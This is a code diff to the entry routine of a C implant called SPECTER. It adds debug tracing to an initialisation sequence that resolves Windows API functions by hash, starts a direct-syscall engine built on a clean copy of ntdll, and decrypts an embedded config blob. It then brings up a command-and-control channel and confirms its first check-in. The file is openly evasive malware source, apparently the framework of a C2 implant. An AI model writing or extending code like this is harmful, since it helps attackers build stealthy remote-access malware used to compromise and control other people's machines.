@@ -25,22 +25,53 @@ static IMPLANT_CONTEXT g_ctx;
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
 
-/* Dev build: resolve ExitProcess for diagnostic exit codes */
+/* Dev build: resolve ExitProcess + OutputDebugStringA for diagnostics */
 #ifdef SPECTER_DEV_BUILD
 typedef void (__attribute__((ms_abi)) *fn_ExitProcess)(DWORD code);
+typedef void (__attribute__((ms_abi)) *fn_OutputDebugStringA)(const char *);
 static fn_ExitProcess g_dev_exit = NULL;
+static fn_OutputDebugStringA g_dev_dbg = NULL;
 
 static void dev_exit(DWORD code) {
     if (g_dev_exit) g_dev_exit(code);
 }
 
+/* Emit a trace string visible in DebugView / WinDbg */
+static void dev_trace(const char *msg) {
+    if (g_dev_dbg) g_dev_dbg(msg);
+}
+
+/* Emit trace with a numeric value: "prefix: NNN" */
+static void dev_trace_val(const char *prefix, DWORD val) {
+    if (!g_dev_dbg) return;
+    char buf[128];
+    DWORD i = 0;
+    const char *p = prefix;
+    while (*p && i < 120) buf[i++] = *p++;
+    buf[i++] = ':'; buf[i++] = ' ';
+    /* Simple decimal conversion */
+    char tmp[12];
+    DWORD t = 0;
+    if (val == 0) { tmp[t++] = '0'; }
+    else { DWORD v = val; while (v) { tmp[t++] = '0' + (v % 10); v /= 10; } }
+    while (t > 0 && i < 126) buf[i++] = tmp[--t];
+    buf[i] = 0;
+    g_dev_dbg(buf);
+}
+
 static void dev_init_exit(PVOID k32) {
     /* DJB2("ExitProcess") = 0x024773DE */
     g_dev_exit = (fn_ExitProcess)find_export_by_hash(k32, 0x024773DE);
+    /* DJB2("OutputDebugStringA") = computed below */
+    g_dev_dbg = (fn_OutputDebugStringA)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
 }
-#define DEV_FAIL(code) do { dev_exit(code); return; } while(0)
+#define DEV_FAIL(code) do { dev_trace_val("SPECTER DEV_FAIL", code); dev_exit(code); return; } while(0)
+#define DEV_TRACE(msg) dev_trace(msg)
+#define DEV_TRACE_VAL(msg, val) dev_trace_val(msg, val)
 #else
 #define DEV_FAIL(code) return
+#define DEV_TRACE(msg) ((void)0)
+#define DEV_TRACE_VAL(msg, val) ((void)0)
 #endif
 
 __attribute__((section(".text$A")))
@@ -66,12 +97,14 @@ void implant_entry(PVOID param) {
     if (k32_base) dev_init_exit(k32_base);
 #endif
     (void)k32_base;
+    DEV_TRACE("[SPECTER] kernel32 + debug init OK");
 
     /* ---- Step 3: Initialize the syscall engine ---- */
     g_ctx.syscall_table = sc_get_table();
     status = sc_init(g_ctx.syscall_table);
     if (!NT_SUCCESS(status))
         DEV_FAIL(12);
+    DEV_TRACE("[SPECTER] syscall engine OK");
 
     g_ctx.clean_ntdll = g_ctx.syscall_table->clean_ntdll;
 
@@ -109,8 +142,10 @@ void implant_entry(PVOID param) {
 #endif
 
     /* ---- Step 4: Initialize config store ---- */
+    DEV_TRACE("[SPECTER] cfg_init...");
     status = cfg_init(&g_ctx);
     if (!NT_SUCCESS(status)) {
+        DEV_TRACE_VAL("[SPECTER] cfg_init FAILED status", (DWORD)(status & 0xFFFF));
         /* Sub-codes: 130 = NULL ctx, 131 = no pic_base, 132 = blob not found,
            133 = decrypt fail, 134 = parse fail, 139 = other */
         if (status == 0xC0000002) DEV_FAIL(130);       /* STATUS_INVALID_PARAMETER */
@@ -167,11 +202,13 @@ void implant_entry(PVOID param) {
 #endif
 
     /* ---- Step 7: Initialize communications engine ---- */
+    DEV_TRACE("[SPECTER] comms_init...");
     status = comms_init(&g_ctx);
     if (!NT_SUCCESS(status)) {
-        /* Output raw status as exit code for debugging */
+        DEV_TRACE_VAL("[SPECTER] comms_init FAILED status", (DWORD)(status & 0xFFFF));
         DEV_FAIL((DWORD)(status & 0xFFFF));
     }
+    DEV_TRACE("[SPECTER] comms_init OK — first checkin succeeded");
 
     /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
     /* Profile blob is expected to be provided via config update or
